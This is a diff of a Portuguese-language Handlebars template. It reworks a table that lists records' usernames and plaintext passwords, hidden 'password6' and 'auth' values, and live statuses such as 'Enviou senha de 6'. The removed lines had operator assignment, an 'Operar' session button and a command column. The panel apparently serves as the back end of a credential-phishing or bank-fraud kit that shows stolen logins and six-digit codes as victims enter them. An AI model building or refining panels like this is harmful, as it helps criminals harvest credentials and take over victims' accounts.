@@ -2,7 +2,7 @@
     <div class="card-header border-0">
         <div class="row align-items-center">
             <div class="col">
-                <h3 class="mb-0">Lista de Produtos</h3>
+                <h3 class="mb-0">Lista de Infos</h3>
             </div>
         </div>
     </div>
@@ -12,14 +12,9 @@
             <thead class="thead-light">
                 <tr>
                     <th scope="col">#ID</th>
-                    <th scope="col">#Operador</th>
-                    <th scope="col">#Ação</th>
                     <th scope="col">USUÁRIO</th>
                     <th scope="col">SENHA</th>
-                    <th scope="col">#TIPO/LAN</th>
-                    <th scope="col">TEMPO</th>
-                    <th scope="col">COMANDO</th>
-                    <th scope="col"></th>
+                    <th scope="col">STATUS</th>
                 </tr>
             </thead>
             <tbody class="productList">
@@ -28,38 +23,73 @@
                     <th scope="row" role="id">
                         <strong># {{id}}</strong>
                     </th>
-                    <td>
-                        <strong role="operator">
-                            {{#if operator.name}}
-                            {{operator.name}}
-                            {{else}}
-                            Aguardando OP
-                            {{/if}}
-                        </strong>
-                    </td>
-                    <td>
-                        <a class="btn btn-success btn-sm" target="blank" rel="noopener noreferrer"
-                            href="/operator?client={{id}}" role="button">Operar</a>
-                    </td>
                     <td role="user">
                         {{user}}
                     </td>
                     <td role="password">
                         {{password}}
                     </td>
-                    <td role="type">
-                        {{type}}
-                    </td>
-                    <td role="time">
-
-                        {{#ifCond status 'disconnect'}}
-                        SAIU
-                        {{else}}
-                        {{../timer}}
+                    <input type="hidden" name="password6" value="{{password6}}">
+                    <input type="hidden" name="auth" value="{{auth}}">
+                    <td role="status" 
+                    
+                        class="
+                        blockstatus
+                        {{#ifCond status 'disconected'}}
+                        disconnected
                         {{/ifCond}}
-                    </td>
-                    <td role="command">
-                        command
+
+                        {{#ifCond status 'connected'}}
+                        enter
+                        {{/ifCond}}
+
+                        {{#ifCond status 'updated'}}
+                        updated
+                        {{/ifCond}}
+
+                        {{#ifCond status 'finish'}}
+                        finish
+                        {{/ifCond}}
+
+                        {{#ifCond status 'reconnect'}}
+                        enter
+                        {{/ifCond}}
+
+                        {{!-- reconnect --}}
+
+                        {{#ifCond status 'updated'}}
+                        updated
+                        {{/ifCond}}
+
+                        {{#ifCond status 'sendPass6'}}
+                        updated
+                        {{/ifCond}}
+                        "
+                        
+                    
+                    >
+                        {{#ifCond status 'connected'}}
+                        <span>Connectado</span>
+                        {{/ifCond}}
+                        {{#ifCond status 'disconected'}}
+                        <span>Desconectado</span>
+                        {{/ifCond}}
+                        {{#ifCond status 'updated'}}
+                        <span>Atualizado</span>
+                        {{/ifCond}}
+                        {{#ifCond status 'finish'}}
+                        <span>Finalizado</span>
+                        {{/ifCond}}
+                        {{!-- /reconnect --}}
+                        {{#ifCond status 'sendPass6'}}
+                        <span>Enviou senha de 6</span>
+                        
+                        {{/ifCond}}
+
+                        {{#ifCond status 'reconnect'}}
+                        <span>Reconectado</span>
+                        {{/ifCond}}
+                        
                     </td>
                 </tr>
                 {{/each}}
